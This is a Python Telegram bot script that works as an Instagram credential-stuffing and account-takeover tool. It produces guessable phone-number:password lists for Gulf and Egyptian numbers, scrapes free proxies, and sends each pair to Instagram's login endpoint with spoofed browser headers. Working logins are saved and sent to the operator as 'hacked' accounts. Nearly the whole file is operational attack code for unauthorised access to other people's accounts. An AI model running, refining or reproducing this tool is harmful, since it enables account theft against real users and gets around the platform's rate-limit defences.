import requests

import random

import telebot

from telebot import types

from time import sleep

import config

c = '1234567890qwertyuiopasdfghjklzxcvbnm'

l = 0

l1 = 50000

Run = True

Run_Checker = True

bot = telebot.TeleBot(config.token)

Start = types.InlineKeyboardButton(text='Start ▶️', callback_data='Start ▶️')

make = types.InlineKeyboardButton(text='Make List 📜', callback_data='Make List 📜')

proxy = types.InlineKeyboardButton(text='Get Proxy 📮', callback_data='Get Proxy 📮')

Stop = types.InlineKeyboardButton(text='Stop 🛑', callback_data='Stop 🛑')

Stop1 = types.InlineKeyboardButton(text='Stop Checking 🛑', callback_data='Stop Checking 🛑')

rebb = types.InlineKeyboardButton(text='Reboot Bot ✳️', callback_data='Reboot Bot ✳️')

Dens1 = types.InlineKeyboardButton(text='Send Done List ✅', callback_data='Send Done Users ✅')

list1 = types.InlineKeyboardButton(text='Send Session Id List 📜', callback_data='Send List Users 📁')

de = types.InlineKeyboardButton(text='Delete List Users 🗑', callback_data='Delete List Users 🗑')

sproxy = types.InlineKeyboardButton(text='Send Proxy List 🗳', callback_data='Send Proxy List 📮')

user12 = types.InlineKeyboardButton(text='user:password', callback_data='mk0')

num1 = types.InlineKeyboardButton(text='num:num', callback_data='mk01')

mk3 = types.InlineKeyboardButton(text='🇸🇦', callback_data='m3')

mk2 = types.InlineKeyboardButton(text='🇪🇬', callback_data='m2')

mk1 = types.InlineKeyboardButton(text='🇦🇪', callback_data='m1')

mk4 = types.InlineKeyboardButton(text='🇮🇶', callback_data='m4')

@bot.message_handler(commands=['start'])

def start(message):

    global Run_Checker,Done

    id_ac = message.from_user.id

    if id_ac == config.id:

        if message.chat.type == 'private':

                                Done = 0

                                Run_Checker = True

                                markup_inline = types.InlineKeyboardMarkup()

                                markup_inline.row_width = 2

                                markup_inline.add(Start, make,rebb,Dens1,list1)

                                bot.send_message(message.chat.id, f'*INSTAGRAM CHECKER🤍*\n\n*Ξ DEVELOPER : @zzaaz*', parse_mode='markdown',reply_markup=markup_inline)

    else:

        pass

def Reboot(message):

    global Run_Checker

    open('list.txt', 'w')

    open('proxy.txt', 'w')

    open('done.txt', 'w')

    Run_Checker = True

    bot.send_message(message.chat.id, text='''*𝗕𝗼𝘁 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘁𝗮𝗿𝘁𝗲𝗱 ▶️ 

 𝗖𝗹𝗶𝗰𝗸 /start  𝗧𝗼 𝘀𝘁𝗮𝗿𝘁 𝗯𝗼𝘁 (:*''', parse_mode='markdown')

def send(message):

    try:

        send = open('done.txt', 'rb')

        bot.send_document(message.chat.id, send)

    except:

        pass

def send1(message):

    send = open('list.txt', 'rb')

    bot.send_document(message.chat.id, send)

def scrap_proxies(message):

    try:

        n = 0

        get = ''

        proxy_list = open("proxy.txt", "w")

        urls = ["https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&ssl=yes","https://www.proxy-list.download/api/v1/get?type=https&anon=elite" , "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all", "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=IN&ssl=all&anonymity=elite"]

        for url in urls:

            get += requests.get(url).text

            scrap = get.split('\r\n')

        for proxies in scrap:

            n +=1

            proxy_list.write(f"{proxies}\n")

        proxy_list.close()

        markup_inline = types.InlineKeyboardMarkup()

        markup_inline.row_width = 2

        markup_inline.add(Start)

        bot.send_message(message.chat.id, text=f'*Done Get Proxies : *{n}', parse_mode='markdown',reply_markup=markup_inline)

    except:

        pass

@bot.callback_query_handler(func=lambda call: True)

def answer(call):

    global Run,l,Run_Checker

    if call.data == 'Make List 📜':

        markup_inline1 = types.InlineKeyboardMarkup()

        markup_inline1.row_width = 2

        markup_inline1.add(mk1,mk2,mk3,mk4)

        sent = bot.send_message(call.message.chat.id, text='*🔢 Choose :*', parse_mode='markdown',reply_markup=markup_inline1)

    if call.data == 'm1':

        sent = bot.send_message(call.message.chat.id, text='🔢 𝗔𝗠𝗢𝗨𝗡𝗧 :')

        bot.register_next_step_handler(sent, Generator_Users1)

    if call.data == 'm2':

        sent = bot.send_message(call.message.chat.id, text='🔢 𝗔𝗠𝗢𝗨𝗡𝗧 :')

        bot.register_next_step_handler(sent, Generator_Users2)

    if call.data == 'm3':

        sent = bot.send_message(call.message.chat.id, text='🔢 𝗔𝗠𝗢𝗨𝗡𝗧 :')

        bot.register_next_step_handler(sent, Generator_Users3)

    if call.data == 'm4':

        sent = bot.send_message(call.message.chat.id, text='🔢 𝗔𝗠𝗢𝗨𝗡𝗧 :')

        bot.register_next_step_handler(sent, Generator_Users4)

    if call.data == 'Start ▶️':

        check(call.message)

    if call.data == 'Send Proxy List 📮':

        send_proxy(call.message)

    if call.data == 'Delete Proxy List 🗑':

        delete_proxy(call.message)

    if call.data == 'Get Proxy 📮':

        scrap_proxies(call.message)

    if call.data == 'Stop 🛑':

        Run = False

        markup_I = types.InlineKeyboardMarkup()

        markup_I.row_width = 2

        markup_I.add(Start, make, proxy,Dens1,list1,rebb)

        bot.send_message(call.message.chat.id, text=f'*I AM STOP ⏸*\n\n*USERS : *{l}', parse_mode='markdown',reply_markup=markup_I)

    if call.data == 'Reboot Bot ✳️':

        Reboot(call.message)

    if call.data == 'Send Done Users ✅':

        send(call.message)

    if call.data == 'Send list Users 📁':

        send1(call.message)

    if call.data == 'Stop Checking 🛑':

        Run_Checker = False

        markup_I = types.InlineKeyboardMarkup()

        markup_I.row_width = 2

        markup_I.add(Start,proxy)

        bot.send_message(call.message.chat.id, text=f'*I AM STOP ⏸*',parse_mode='markdown')

    if call.data == 'Delete list Users 🗑':

        delete_list(call.message)

    if call.data == 'Delete Done Users 🗑':

        delete_done(call.message)

def Generator_Users(message):

    try:

        global l,l1,Run

        msg = message.text

        markup_I = types.InlineKeyboardMarkup()

        markup_I.row_width = 2

        markup_I.add(Start)

        length = message.text

        bot.send_message(message.chat.id, text='⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 >>>>')

        chars = '1234567890'

        for user in range(int(msg)):

                user = ''

                for item in range(8):

                    user += random.choice(chars)

                with open('list.txt', 'a') as xx:

                    xx.write('96478'+user+':'+'078'+user+'\n')

        bot.send_message(message.chat.id, text='𝗜 𝗔𝗠 𝗗𝗢𝗡𝗘 𝗦𝗜𝗥 ✅', reply_markup=markup_I)

    except:

        pass

def Generator_Users4(message):

    try:

        global l,l1,Run

        msg = message.text

        markup_I = types.InlineKeyboardMarkup()

        markup_I.row_width = 2

        markup_I.add(Start)

        length = message.text

        bot.send_message(message.chat.id, text='⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 >>>>')

        chars = '1234567890'

        for user in range(int(msg)):

                user = ''

                for item in range(8):

                    user += random.choice(chars)

                with open('list.txt', 'a') as xx:

                    xx.write('96477'+user+':'+'077'+user+'\n')

        bot.send_message(message.chat.id, text='𝗜 𝗔𝗠 𝗗𝗢𝗡𝗘 𝗦𝗜𝗥 ✅', reply_markup=markup_I)

    except:

        pass

def Generator_Users2(message):

    try:

        global l,l1,Run

        msg = message.text

        markup_I = types.InlineKeyboardMarkup()

        markup_I.row_width = 2

        markup_I.add(Start)

        length = message.text

        bot.send_message(message.chat.id, text='⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 >>>>')

        chars = '1234567890'

        for user in range(int(msg)):

                user = ''

                for item in range(8):

                    user += random.choice(chars)

                with open('list.txt', 'a') as xx:

                    xx.write('20010'+user+':'+'010'+user+'\n')

        bot.send_message(message.chat.id, text='𝗜 𝗔𝗠 𝗗𝗢𝗡𝗘 𝗦𝗜𝗥 ✅', reply_markup=markup_I)

    except:

        pass

def Generator_Users3(message):

    try:

        global l,l1,Run

        msg = message.text

        markup_I = types.InlineKeyboardMarkup()

        markup_I.row_width = 2

        markup_I.add(Start)

        length = message.text

        bot.send_message(message.chat.id, text='⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 >>>>')

        chars = '1234567890'

        for user in range(int(msg)):

                user = ''

                for item in range(7):

                    user += random.choice(chars)

                with open('list.txt', 'a') as xx:

                    xx.write('96650'+user+':'+'50'+user+'\n')

        bot.send_message(message.chat.id, text='𝗜 𝗔𝗠 𝗗𝗢𝗡𝗘 𝗦𝗜𝗥 ✅', reply_markup=markup_I)

    except:

        pass

def check(message):

    try:

                    ep = 0

                    list = open('list.txt', 'r').read().splitlines()

                    fa = 0

                    global Run_Checker

                    Done = 0

                    prl = open('proxy.txt', 'r').read().splitlines()

                    Error = 0

                    ErrorUsers = 0

                    lenusers = len(list)

                    markup_Stope = types.InlineKeyboardMarkup()

                    markup_Stope.row_width = 2

                    markup_Stope.add(Stop1)

                    bot.send_message(message.chat.id, text='*Started (:*', parse_mode='markdown')

                    mm = []

                    for add in list:

                        i = add.split(":")[0]

                        password = add.split(":")[1]

                        for shit in prl:

                            mm.append(shit)

                            rpn = str(random.choice(prl))

                        try:

                            if Run_Checker == True:

                                url = 'https://www.instagram.com/accounts/login/ajax/'

                                data = {

                                        'username': i,

                                        'enc_password': "#PWD_INSTAGRAM_BROWSER:0:1620603674:"+ password +"",

                                        'queryParams': '{}',

                                        'optIntoOneTap': 'false',

                                        'stopDeletionNonce': ''

                                }

                                headers = {

                                        'accept': '*/*',

                                        'accept-encoding': 'gzip, deflate, br',

                                        'accept-language': 'en-US,en;q=0.9',

                                        'content-length': '289',

                                        'content-type': 'application/x-www-form-urlencoded',

                                        'cookie': 'csrftoken=xYTx128YH3EoFYJX1h0KQJqO4HSSbrWP; mid=YJhy1gALAAH_jVn7USvQSCRDjTD9; ig_did=29C18B94-18E0-4CFF-88DB-F47E707B59DB; ig_nrcb=1',

                                        'origin': 'https://www.instagram.com',

                                        'referer': 'https://www.instagram.com/',

                                        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',

                                        'sec-ch-ua-mobile': '?0',

                                        'sec-fetch-dest': 'empty',

                                        'sec-fetch-mode': 'cors',

                                        'sec-fetch-site': 'same-origin',

                                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',

                                        'x-csrftoken': 'xYTx128YH3EoFYJX1h0KQJqO4HSSbrWP',

                                        'x-ig-app-id': '936619743392459',

                                        'x-ig-www-claim': '0',

                                        'x-instagram-ajax': 'fae627f53bc4',

                                        'x-requested-with': 'XMLHttpRequest',

                                }

                                https = {

                                    'http': 'http://{}'.format(rpn),

                                    'https': 'http://{}'.format(rpn),

                                }

                                requests.proxies = https

                                re = requests.post(url,headers=headers,data=data)

                                sleep(config.sle)

                                if '"authenticated":true,"' in re.text:

                                    Done +=1

                                    bot.edit_message_text(chat_id=message.chat.id, text=f'*𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️*\n\n*Ξ 𝗖𝗼𝘂𝗻𝘁 :   *{lenusers}\n\n*Ξ 𝗜𝗻 :   *{i}:{password}\n\n*[✅] 𝗗𝗼𝗻𝗲 :   *{Done}\n\n*[❌] 𝗕𝗮𝗱 :   *{Error}\n\n*[⚠️] 𝗦𝗰𝘂𝗿𝗲 :   *{fa}\n\n*[📮] 𝗘𝗿𝗿𝗼𝗿 𝗣𝗿𝗼𝘅𝘆 :   *{ep}\n\n*[🛑] 𝗘𝗿𝗿𝗼𝗿 :   *{ErrorUsers}', parse_mode='markdown', message_id=message.message_id +1,reply_markup=markup_Stope)

                                    with open('done.txt', 'a') as ans1:

                                        ans1.write(i+password+'\n')

                                    bot.send_message(message.chat.id, text=f'⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {i}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @ZzBoTs - @PiPPi')

                                elif '"authenticated":false,"' in re.text:

                                    Error +=1

                                    bot.edit_message_text(chat_id=message.chat.id, text=f'*𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️*\n\n*Ξ 𝗖𝗼𝘂𝗻𝘁 :   *{lenusers}\n\n*Ξ 𝗜𝗻 :   *{i}:{password}\n\n*[✅] 𝗗𝗼𝗻𝗲 :   *{Done}\n\n*[❌] 𝗕𝗮𝗱 :   *{Error}\n\n*[⚠️] 𝗦𝗰𝘂𝗿𝗲 :   *{fa}\n\n*[📮] 𝗘𝗿𝗿𝗼𝗿 𝗣𝗿𝗼𝘅𝘆 :   *{ep}\n\n*[🛑] 𝗘𝗿𝗿𝗼𝗿 :   *{ErrorUsers}', parse_mode='markdown', message_id=message.message_id +1,reply_markup=markup_Stope)

                                elif 'checkpoint_required' in re.text:

                                    fa +=1

                                    bot.edit_message_text(chat_id=message.chat.id, text=f'*𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️*\n\n*Ξ 𝗖𝗼𝘂𝗻𝘁 :   *{lenusers}\n\n*Ξ 𝗜𝗻 :   *{i}:{password}\n\n*[✅] 𝗗𝗼𝗻𝗲 :   *{Done}\n\n*[❌] 𝗕𝗮𝗱 :   *{Error}\n\n*[⚠️] 𝗦𝗰𝘂𝗿𝗲 :   *{fa}\n\n*[📮] 𝗘𝗿𝗿𝗼𝗿 𝗣𝗿𝗼𝘅𝘆 :   *{ep}\n\n*[🛑] 𝗘𝗿𝗿𝗼𝗿 :   *{ErrorUsers}', parse_mode='markdown', message_id=message.message_id +1,reply_markup=markup_Stope)

                                    bot.send_message(message.chat.id, text=f'⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {i}\n⌯ ᴘᴀѕѕ : {password}\nCheckPoint!\n— — — — —  — — — — —\nFrom : @ZzBoTs - @PiPPi')

                                else:

                                    ErrorUsers +=1

                                    bot.edit_message_text(chat_id=message.chat.id, text=f'*𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️*\n\n*Ξ 𝗖𝗼𝘂𝗻𝘁 :   *{lenusers}\n\n*Ξ 𝗜𝗻 :   *{i}:{password}\n\n*[✅] 𝗗𝗼𝗻𝗲 :   *{Done}\n\n*[❌] 𝗕𝗮𝗱 :   *{Error}\n\n*[⚠️] 𝗦𝗰𝘂𝗿𝗲 :   *{fa}\n\n*[📮] 𝗘𝗿𝗿𝗼𝗿 𝗣𝗿𝗼𝘅𝘆 :   *{ep}\n\n*[🛑] 𝗘𝗿𝗿𝗼𝗿 :   *{ErrorUsers}', parse_mode='markdown', message_id=message.message_id +1,reply_markup=markup_Stope)

                        except requests.ConnectionError:

                                ep +=1

                                bot.edit_message_text(chat_id=message.chat.id, text=f'*𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️*\n\n*Ξ 𝗖𝗼𝘂𝗻𝘁 :   *{lenusers}\n\n*Ξ 𝗜𝗻 :   *{i}:{password}\n\n*[✅] 𝗗𝗼𝗻𝗲 :   *{Done}\n\n*[❌] 𝗕𝗮𝗱 :   *{Error}\n\n*[⚠️] 𝗦𝗰𝘂𝗿𝗲 :   *{fa}\n\n*[📮] 𝗘𝗿𝗿𝗼𝗿 𝗣𝗿𝗼𝘅𝘆 :   *{ep}\n\n*[🛑] 𝗘𝗿𝗿𝗼𝗿 :   *{ErrorUsers}', parse_mode='markdown', message_id=message.message_id +1,reply_markup=markup_Stope)

    except:

        pass 

bot.polling(True)
